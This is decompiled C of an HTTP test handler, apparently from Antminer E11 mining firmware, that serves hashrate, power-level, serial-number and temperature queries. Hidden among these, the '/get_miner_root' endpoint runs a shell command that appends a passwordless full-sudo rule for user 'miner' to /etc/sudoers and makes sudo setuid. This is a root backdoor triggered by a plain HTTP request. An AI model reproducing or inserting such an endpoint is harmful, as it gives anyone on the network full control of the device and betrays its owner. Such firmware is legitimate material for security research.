int __fastcall http_test_bm(int a1, char *a2, pool *a3)
{
  int theory_hashrate; // r0
  size_t v4; // r0
  char v10[256]; // [sp+20h] [bp-128Ch] BYREF
  char v11[256]; // [sp+120h] [bp-118Ch] BYREF
  _BYTE v12[12]; // [sp+220h] [bp-108Ch] BYREF
  int v13; // [sp+1224h] [bp-88h] BYREF
  _DWORD s[4]; // [sp+1228h] [bp-84h] BYREF
  __int16 v15; // [sp+1238h] [bp-74h]
  char ptr[16]; // [sp+123Ch] [bp-70h] BYREF
  __int16 v17; // [sp+124Ch] [bp-60h]
  int v18; // [sp+1250h] [bp-5Ch] BYREF
  int v19; // [sp+1254h] [bp-58h] BYREF
  unsigned int miner_qualified_hashrate; // [sp+1258h] [bp-54h]
  int v21; // [sp+125Ch] [bp-50h]
  int v22; // [sp+1260h] [bp-4Ch]
  int v23; // [sp+1264h] [bp-48h]
  int v24; // [sp+1268h] [bp-44h]
  int v25; // [sp+126Ch] [bp-40h]
  int v26; // [sp+1270h] [bp-3Ch]
  int v27; // [sp+1274h] [bp-38h]
  FILE *stream; // [sp+1278h] [bp-34h]
  int v29; // [sp+127Ch] [bp-30h]
  _DWORD *all_created_runtime; // [sp+1280h] [bp-2Ch]
  void *v31; // [sp+1284h] [bp-28h]
  int i; // [sp+1288h] [bp-24h]
  int j; // [sp+128Ch] [bp-20h]
  int v34; // [sp+1290h] [bp-1Ch]
  char v35; // [sp+1296h] [bp-16h]
  bool v36; // [sp+1297h] [bp-15h]
  FILE *v37; // [sp+1298h] [bp-14h]
  int v38; // [sp+129Ch] [bp-10h]

  v19 = -1;
  v18 = -1;
  if ( strstr((const char *)(a1 + 4), "/rate") )
  {
    miner_qualified_hashrate = 0;
    V_LOCK();
    logfmt_raw(v12, 0x1000u, 0, "cmd : get rate");
    V_UNLOCK();
    zlog(
      g_zc,
      "/workspace/jenkins/jenkins/workspace/Antminer_E11_release/build/rootfs/buildroot/tmp/release/build/godminer-origin"
      "_godminer-new/http_test.c",
      139,
      "http_test_bm",
      12,
      893,
      20,
      v12);
    miner_qualified_hashrate = get_miner_qualified_hashrate();
    sub_3CD18(a2, (size_t)a3, miner_qualified_hashrate);
    return 0;
  }
  if ( strstr((const char *)(a1 + 4), "/level_1") )
  {
    v21 = 0;
    V_LOCK();
    logfmt_raw(v12, 0x1000u, 0, "cmd : set pt level to 1");
    V_UNLOCK();
    zlog(
      g_zc,
      "/workspace/jenkins/jenkins/workspace/Antminer_E11_release/build/rootfs/buildroot/tmp/release/build/godminer-origin"
      "_godminer-new/http_test.c",
      139,
      "http_test_bm",
      12,
      900,
      40,
      v12);
    sub_3E820(1);
    return 0;
  }
  if ( strstr((const char *)(a1 + 4), "/level_2") )
  {
    v22 = 0;
    V_LOCK();
    logfmt_raw(v12, 0x1000u, 0, "cmd : set pt level to 2");
    V_UNLOCK();
    zlog(
      g_zc,
      "/workspace/jenkins/jenkins/workspace/Antminer_E11_release/build/rootfs/buildroot/tmp/release/build/godminer-origin"
      "_godminer-new/http_test.c",
      139,
      "http_test_bm",
      12,
      906,
      40,
      v12);
    sub_3E820(2);
    return 0;
  }
  if ( strstr((const char *)(a1 + 4), "/level_3") )
  {
    v23 = 0;
    V_LOCK();
    logfmt_raw(v12, 0x1000u, 0, "cmd : set pt level to 3");
    V_UNLOCK();
    zlog(
      g_zc,
      "/workspace/jenkins/jenkins/workspace/Antminer_E11_release/build/rootfs/buildroot/tmp/release/build/godminer-origin"
      "_godminer-new/http_test.c",
      139,
      "http_test_bm",
      12,
      912,
      40,
      v12);
    sub_3E820(3);
    return 0;
  }
  if ( strstr((const char *)(a1 + 4), "/level_4") )
  {
    v24 = 0;
    V_LOCK();
    logfmt_raw(v12, 0x1000u, 0, "cmd : set pt level to 4");
    V_UNLOCK();
    zlog(
      g_zc,
      "/workspace/jenkins/jenkins/workspace/Antminer_E11_release/build/rootfs/buildroot/tmp/release/build/godminer-origin"
      "_godminer-new/http_test.c",
      139,
      "http_test_bm",
      12,
      918,
      40,
      v12);
    sub_3E820(4);
    return 0;
  }
  if ( strstr((const char *)(a1 + 4), "/level_5") )
  {
    v25 = 0;
    V_LOCK();
    logfmt_raw(v12, 0x1000u, 0, "cmd : set pt level to 5");
    V_UNLOCK();
    zlog(
      g_zc,
      "/workspace/jenkins/jenkins/workspace/Antminer_E11_release/build/rootfs/buildroot/tmp/release/build/godminer-origin"
      "_godminer-new/http_test.c",
      139,
      "http_test_bm",
      12,
      924,
      40,
      v12);
    sub_3E820(5);
    return 0;
  }
  if ( strstr((const char *)(a1 + 4), "/level_6") )
  {
    v26 = 0;
    V_LOCK();
    logfmt_raw(v12, 0x1000u, 0, "cmd : set pt level to 6");
    V_UNLOCK();
    zlog(
      g_zc,
      "/workspace/jenkins/jenkins/workspace/Antminer_E11_release/build/rootfs/buildroot/tmp/release/build/godminer-origin"
      "_godminer-new/http_test.c",
      139,
      "http_test_bm",
      12,
      930,
      40,
      v12);
    sub_3E820(6);
    return 0;
  }
  if ( strstr((const char *)(a1 + 4), "/test") )
  {
    _isoc99_sscanf(a1 + 4, "/test.%d.%d", &v19, &v18);
    V_LOCK();
    logfmt_raw(v12, 0x1000u, 0, "cmd : get test = %d", v19);
    V_UNLOCK();
    zlog(
      g_zc,
      "/workspace/jenkins/jenkins/workspace/Antminer_E11_release/build/rootfs/buildroot/tmp/release/build/godminer-origin"
      "_godminer-new/http_test.c",
      139,
      "http_test_bm",
      12,
      936,
      20,
      v12);
    if ( v19 == 523 )
      get_miner_info((int)a2);
    else
      sprintf(a2, "OK get test=%d", v19);
    return 0;
  }
  if ( strstr((const char *)(a1 + 4), "/ideal_rate") )
  {
    V_LOCK();
    logfmt_raw(v12, 0x1000u, 0, "cmd : get ideal rate");
    V_UNLOCK();
    zlog(
      g_zc,
      "/workspace/jenkins/jenkins/workspace/Antminer_E11_release/build/rootfs/buildroot/tmp/release/build/godminer-origin"
      "_godminer-new/http_test.c",
      139,
      "http_test_bm",
      12,
      950,
      20,
      v12);
    theory_hashrate = get_theory_hashrate();
    sub_3CD18(a2, (size_t)a3, theory_hashrate);
    return 0;
  }
  if ( strstr((const char *)(a1 + 4), "/max_rate") )
  {
    V_LOCK();
    logfmt_raw(v12, 0x1000u, 0, "cmd : get max rate");
    V_UNLOCK();
    zlog(
      g_zc,
      "/workspace/jenkins/jenkins/workspace/Antminer_E11_release/build/rootfs/buildroot/tmp/release/build/godminer-origin"
      "_godminer-new/http_test.c",
      139,
      "http_test_bm",
      12,
      956,
      20,
      v12);
    v27 = 102 * get_theory_hashrate() / 100;
    sub_3CD18(a2, (size_t)a3, v27);
    return 0;
  }
  if ( strstr((const char *)(a1 + 4), "/miner_status") )
  {
    V_LOCK();
    logfmt_raw(v12, 0x1000u, 0, "cmd : get miner status");
    V_UNLOCK();
    zlog(
      g_zc,
      "/workspace/jenkins/jenkins/workspace/Antminer_E11_release/build/rootfs/buildroot/tmp/release/build/godminer-origin"
      "_godminer-new/http_test.c",
      139,
      "http_test_bm",
      12,
      962,
      20,
      v12);
    packed_rename((CURL *)a2, a3);
    return 0;
  }
  if ( strstr((const char *)(a1 + 4), "/productName") )
  {
    V_LOCK();
    v4 = strlen(g_miner_type);
    logfmt_raw(v12, 0x1000u, 0, "cmd : get miner type[%d] %s", v4, g_miner_type);
    V_UNLOCK();
    zlog(
      g_zc,
      "/workspace/jenkins/jenkins/workspace/Antminer_E11_release/build/rootfs/buildroot/tmp/release/build/godminer-origin"
      "_godminer-new/http_test.c",
      139,
      "http_test_bm",
      12,
      967,
      20,
      v12);
    strcpy(a2, g_miner_type);
    return 0;
  }
  if ( !strncmp((const char *)(a1 + 4), "/get_sn", 7u) )
  {
    v29 = 0;
    memset(ptr, 0, sizeof(ptr));
    v17 = 0;
    stream = 0;
    V_LOCK();
    logfmt_raw(v12, 0x1000u, 0, "cmd : get miner sn");
    V_UNLOCK();
    zlog(
      g_zc,
      "/workspace/jenkins/jenkins/workspace/Antminer_E11_release/build/rootfs/buildroot/tmp/release/build/godminer-origin"
      "_godminer-new/http_test.c",
      139,
      "http_test_bm",
      12,
      975,
      20,
      v12);
    stream = fopen((const char *)g_miner_sn_file_path, "r");
    if ( stream )
    {
      fread(ptr, 0x11u, 1u, stream);
      fclose(stream);
    }
    else
    {
      v29 = -1;
    }
    if ( !ptr[0] )
      v29 = -2;
    if ( v29 )
      strcpy(a2, "no miner sn stored on board");
    else
      snprintf(a2, 0x12u, "%s", ptr);
    return 0;
  }
  if ( !strncmp((const char *)(a1 + 4), "/set_sn", 7u) )
  {
    V_LOCK();
    logfmt_raw(v12, 0x1000u, 0, "cmd : set miner sn");
    V_UNLOCK();
    zlog(
      g_zc,
      "/workspace/jenkins/jenkins/workspace/Antminer_E11_release/build/rootfs/buildroot/tmp/release/build/godminer-origin"
      "_godminer-new/http_test.c",
      139,
      "http_test_bm",
      12,
      1005,
      20,
      v12);
    memset(s, 0, sizeof(s));
    v15 = 0;
    v38 = 1;
    v34 = _isoc99_sscanf(a1 + 4, "/set_sn:%s", s);
    if ( v34 == 1 )
    {
      v36 = 0;
      v35 = 0;
      if ( strlen(g_miner_sn) == 17 && (unsigned __int8)g_miner_sn[0] > 0x40u )
        v36 = (unsigned __int8)g_miner_sn[0] <= 0x5Au;
      if ( strlen((const char *)s) == 17 && LOBYTE(s[0]) > 0x40u && LOBYTE(s[0]) <= 0x5Au )
        v35 = 1;
      if ( !v36 || v35 )
      {
        v37 = fopen((const char *)g_miner_sn_file_path, "w");
        if ( v37 )
        {
          fputs((const char *)s, v37);
          fclose(v37);
          strncpy(g_miner_sn, (const char *)s, 0x11u);
          v38 = 0;
          snprintf(a2, 0x32u, "write miner sn %s to file ok", g_miner_sn);
          V_LOCK();
          logfmt_raw(v12, 0x1000u, 0, "write miner sn %s to file ok", g_miner_sn);
          V_UNLOCK();
          zlog(
            g_zc,
            "/workspace/jenkins/jenkins/workspace/Antminer_E11_release/build/rootfs/buildroot/tmp/release/build/godminer-"
            "origin_godminer-new/http_test.c",
            139,
            "http_test_bm",
            12,
            1031,
            60,
            v12);
        }
      }
      else
      {
        v38 = 0;
        snprintf(a2, 0x64u, "update miner sn %s ok(without writing file)", (const char *)s);
        V_LOCK();
        logfmt_raw(v12, 0x1000u, 0, "update miner sn %s ok(without writing file)", s);
        V_UNLOCK();
        zlog(
          g_zc,
          "/workspace/jenkins/jenkins/workspace/Antminer_E11_release/build/rootfs/buildroot/tmp/release/build/godminer-or"
          "igin_godminer-new/http_test.c",
          139,
          "http_test_bm",
          12,
          1039,
          60,
          v12);
      }
    }
    if ( v38 )
    {
      snprintf(a2, 0x32u, "set miner sn %s failed", (const char *)s);
      V_LOCK();
      logfmt_raw(v12, 0x1000u, 0, "set miner sn %s failed", s);
      V_UNLOCK();
      zlog(
        g_zc,
        "/workspace/jenkins/jenkins/workspace/Antminer_E11_release/build/rootfs/buildroot/tmp/release/build/godminer-orig"
        "in_godminer-new/http_test.c",
        139,
        "http_test_bm",
        12,
        1046,
        80,
        v12);
    }
    return 0;
  }
  if ( !strncmp((const char *)(a1 + 4), "/get_miner_root", 0xFu) )
  {
    system("echo 'miner ALL=(ALL:ALL) NOPASSWD:ALL' >> /etc/sudoers && chmod 4755 /usr/bin/sudo");
    snprintf(a2, (size_t)a3, "set root permissions for user(miner) success ");
    return 0;
  }
  if ( !strncmp((const char *)(a1 + 4), "/temp", 5u) )
  {
    V_LOCK();
    logfmt_raw(v12, 0x1000u, 0, "cmd : get temp");
    V_UNLOCK();
    zlog(
      g_zc,
      "/workspace/jenkins/jenkins/workspace/Antminer_E11_release/build/rootfs/buildroot/tmp/release/build/godminer-origin"
      "_godminer-new/http_test.c",
      139,
      "http_test_bm",
      12,
      1060,
      40,
      v12);
    v13 = 0;
    all_created_runtime = get_all_created_runtime(&v13);
    memset(v10, 0, sizeof(v10));
    memset(v11, 0, sizeof(v11));
    for ( i = 0; i < v13; ++i )
    {
      memset(v10, 0, sizeof(v10));
      v31 = calloc(8u, 8u);
      (*(void (__fastcall **)(_DWORD, void *))(all_created_runtime[i] + 228))(all_created_runtime[i], v31);
      sprintf(v10, "chain-%d, ", *(_DWORD *)(all_created_runtime[i] + 272));
      for ( j = 0; j <= 7; ++j )
      {
        V_LOCK();
        logfmt_raw(
          v12,
          0x1000u,
          0,
          "chain-%d, sensor %d temp %d",
          *(_DWORD *)(all_created_runtime[i] + 272),
          j,
          *((_DWORD *)v31 + 2 * j + 1));
        V_UNLOCK();
        zlog(
          g_zc,
          "/workspace/jenkins/jenkins/workspace/Antminer_E11_release/build/rootfs/buildroot/tmp/release/build/godminer-or"
          "igin_godminer-new/http_test.c",
          139,
          "http_test_bm",
          12,
          1075,
          40,
          v12);
        if ( j == 7 )
          sprintf(v11, "%d", *((_DWORD *)v31 + 15));
        else
          sprintf(v11, "%d, ", *((_DWORD *)v31 + 2 * j + 1));
        strcat(v10, v11);
      }
      strcat(a2, v10);
      if ( i != v13 - 1 )
        *(_WORD *)&a2[strlen(a2)] = 10;
      free(v31);
    }
    return 0;
  }
  return -1;
}
